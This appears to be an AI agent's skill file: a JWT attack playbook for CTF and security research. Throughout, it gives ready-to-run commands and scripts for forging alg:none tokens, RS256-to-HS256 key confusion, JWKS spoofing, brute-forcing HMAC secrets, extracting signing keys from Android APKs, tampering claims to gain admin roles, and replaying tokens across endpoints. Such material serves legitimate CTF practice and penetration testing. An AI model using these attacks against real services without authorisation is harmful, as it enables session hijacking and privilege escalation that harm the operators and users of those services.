---
name: jwt-attack-playbook
description: "JWT decode and attack playbook for CTF and security research. Four attack areas: (1) decode/inspect claims, (2) algorithm confusion (alg:none, RS256→HS256), (3) key extraction from Android APKs, (4) token replay and session fixation. Includes jwt_tool command reference, automated analysis scripts, Frida JWT hooking, mitmproxy capture addon. Use when encountering JWTs in Android CTF or web security challenges."
trigger_keywords: "jwt, json web token, alg none, rs256 hs256, key confusion, jwt attack, jwt decode, token replay, jwt secret, jwt forge, session fixation, jwt android"
version: 1.0
created: 2026-02-24
owner: cyber-operator
---

# JWT Attack Playbook

## Purpose

Four-area attack pipeline for JWTs encountered in CTF and security research: decode → identify vulnerability → extract key → forge → replay.

---

## Quick Decision Tree

```
Intercept JWT
├── alg: none → alg:none bypass (jwt_tool -X a)
├── alg: HS256 → Hardcoded secret in APK (jadx + grep)
├── alg: RS256 → RS256→HS256 key confusion (jwt_tool -X k)
├── Missing exp → Infinite replay (test across endpoints)
├── jku in header → JWKS injection (jwt_tool -X s)
└── kid in header → Path traversal / SQLi in kid value
```

---

## Area 1: Decode & Inspect

```bash
python3 jwt_tool.py <TOKEN>                    # Full decode
jwt decode --no-verify <TOKEN>                 # jwt-cli
jq -R 'split(".") | .[0:2] | map(@base64d) | map(fromjson)' <<< "$TOKEN"  # jq
```

**Auto-analysis script:**
```python
import jwt, json
from datetime import datetime, timezone

def analyze_jwt(token):
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    alg = header.get('alg', 'MISSING')
    if alg.lower() == 'none': print("🚩 CRITICAL: alg=none")
    if 'jku' in header: print(f"🚩 jku: {header['jku']} — JWKS injection")
    if 'jwk' in header: print("🚩 jwk embedded — key injection CVE-2018-0114")
    if 'kid' in header: print(f"🚩 kid={header['kid']} — path traversal/SQLi")
    if 'exp' not in payload: print("🚩 No exp — infinite replay!")
    for claim in ['role','admin','is_admin','permissions']:
        if claim in payload: print(f"🎯 Escalation target: {claim}={payload[claim]}")
```

**CTF pattern:** "Inspect the token" → flag is in payload. Look for `{"flag":"CTF{...}"}` or `"admin":false`.

---

## Area 2: Algorithm Confusion

### alg:none (CVE-2015-2951)

```bash
python3 jwt_tool.py <TOKEN> -X a
python3 jwt_tool.py <TOKEN> -X a -I -pc role -pv admin  # + claim tamper
```

Manual:
```python
import base64, json
def craft_none_token(claims):
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."  # Trailing dot = empty signature
```

### RS256→HS256 Key Confusion (CVE-2016-10555)

```bash
# Extract public key from TLS
openssl s_client -connect target.com:443 </dev/null | sed -n '/-----BEGIN/,/-----END/p' > cert.pem
openssl x509 -pubkey -in cert.pem -noout > pubkey.pem

# Extract from APK
unzip -p target.apk META-INF/*.RSA | openssl pkcs7 -inform DER -print_certs | openssl x509 -pubkey -noout > pubkey.pem

# Attack
python3 jwt_tool.py <TOKEN> -X k -pk pubkey.pem -I -pc role -pv admin
```

### jwt_tool Exploit Mode Reference

```bash
-X a   # alg:none
-X k   # Key confusion RS→HS (needs -pk)
-X i   # JWKS injection
-X s   # Spoof JWKS via jku
-X p   # Psychic signature ECDSA (CVE-2022-21449)
python3 jwt_tool.py -t https://target.com/api -rc "jwt=<TOKEN>" -M at  # Scan all attacks
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt     # Brute-force HMAC
```

---

## Area 3: Key Extraction from APK (HS256)

```bash
jadx -d decompiled/ --deobf target.apk

# JWT/HMAC secrets
grep -rEHin "jwt|secret|signing.key|hmac|HS256|RS256" decompiled/
grep -rEHin "api.?key|private.?key|auth.?token" decompiled/
grep -rn "BEGIN.*KEY\|MII[A-Za-z]" decompiled/  # PEM material
grep -rEHn "[A-Za-z0-9+/]{40,}={0,2}" decompiled/resources/  # High-entropy base64
find decompiled/ -name "BuildConfig.java" -exec cat {} \;
for lib in decompiled/resources/lib/*/lib*.so; do
    strings "$lib" | grep -iE "secret|key|jwt|hmac"
done
```

**Automated:** `apkleaks -f target.apk --json` | `trufflehog filesystem decompiled/`

**CTF pattern:** HS256 algorithm + APK provided → static analysis. `BuildConfig.java` is always first stop.

---

## Area 4: Replay & Session Fixation

### mitmproxy JWT Capture

```bash
mitmdump -s jwt_capture.py
# Saves to captured_jwts.json — see full addon in vault
```

### Replay Tests

```bash
# Expired token
curl -H "Authorization: Bearer <expired_jwt>" https://target.com/api/protected

# Post-logout replay
curl -X POST https://target.com/api/logout -H "Authorization: Bearer $TOKEN"
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/protected  # Must fail

# Endpoint sweep
for ep in /api/users /api/admin /api/flag /api/debug; do
    echo "=== $ep ===" && curl -s -w "%{http_code}\n" -H "Authorization: Bearer <jwt>" https://target.com$ep
done
```

### Frida JWT Interception (OkHttp + SharedPrefs)

See vault: `memory/Skills-Learned/JWT-Attack-Playbook-Android-CTF.md` for full Frida script.

**CTF pattern:** Missing `exp` → infinite replay. Logout endpoint present → test post-logout. Two accounts → cross-user substitution (IDOR).

---

## CTF Flag Pattern Quick Reference

| Symptom | Attack |
|---|---|
| "Inspect the token" | Payload contains flag claim |
| RS256 + findable pubkey | RS256→HS256 confusion |
| HS256 + APK provided | Hardcoded secret in APK |
| "alg" header accepted freely | alg:none bypass |
| No `exp` claim | Infinite replay |
| Logout endpoint exists | Post-logout replay |
| Two user accounts | Cross-user IDOR substitution |

---

## Vault References

- `memory/Skills-Learned/JWT-Attack-Playbook-Android-CTF.md` — full code including jwt_capture.py, Frida hook
- `memory/Skills-Learned/Android-CTF-Dynamic-Analysis.md` — APK decompilation workflow
- `a technique-reference note` — JWT pipeline architecture
- `skills/domains/cyber/mitmproxy-agent-workflow.md` — traffic interception setup

---

*JWT Attack Playbook v1.0 | cyber-operator | 2026-02-24*
